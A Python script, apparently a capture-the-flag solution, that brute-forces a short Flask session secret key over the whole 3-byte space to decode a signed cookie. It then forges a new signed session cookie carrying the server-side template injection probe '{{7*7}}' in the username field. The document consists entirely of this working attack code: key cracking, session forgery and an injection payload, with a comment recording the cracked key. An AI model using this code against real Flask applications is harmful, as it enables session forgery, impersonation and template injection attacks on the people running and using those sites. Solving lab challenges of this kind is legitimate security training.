def decode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer

    salt = "cookie-session"
    serializer = TaggedJSONSerializer()
    signer_kwargs = {"key_derivation": "hmac", "digest_method": hashlib.sha1}
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs
    )
    return s.loads(cookie_str)


wordlist = []

secret_key_haha = b''

for i in range(256**3):
    # Convert the integer to bytes and add leading zeros if necessary
    wordlist.append(i.to_bytes(3, byteorder='big'))
print("wordlist generated successfully")
for word in wordlist:
    print("Trying "+str(word))
    try:
        res = decode_flask_cookie(
            word, "eyJmbGFnIjoiW1RIRSBFWUUgMV0gb25faXNfanVzdF9hX2xpZV9fKl8qfSIsInVzZXJuYW1lIjoiY3VyaW91cyJ9.ZFbIIQ.ncYuh-QhnRLZJy9QfusHjW02zBY"
        )
        # except BadSignature:
        	# continue
        print(word)
        print(res)
        secret_key_haha = word # In this challenge is b'\x9d\xdd\x82'
        break
    except:
        continue
print("Found secret_key:"+str(word))
WTF = {"flag":"[THE EYE 1] on_is_just_a_lie__*_*}","username":"{{7*7}}"}


def encode_flask_cookie(secret_key, cookie_str):
    import hashlib
    from itsdangerous import URLSafeTimedSerializer
    from flask.sessions import TaggedJSONSerializer

    salt = "cookie-session"
    serializer = TaggedJSONSerializer()
    signer_kwargs = {"key_derivation": "hmac", "digest_method": hashlib.sha1}
    s = URLSafeTimedSerializer(
        secret_key, salt=salt, serializer=serializer, signer_kwargs=signer_kwargs
    )
    return s.dumps(cookie_str)

print(encode_flask_cookie(secret_key_haha,WTF))
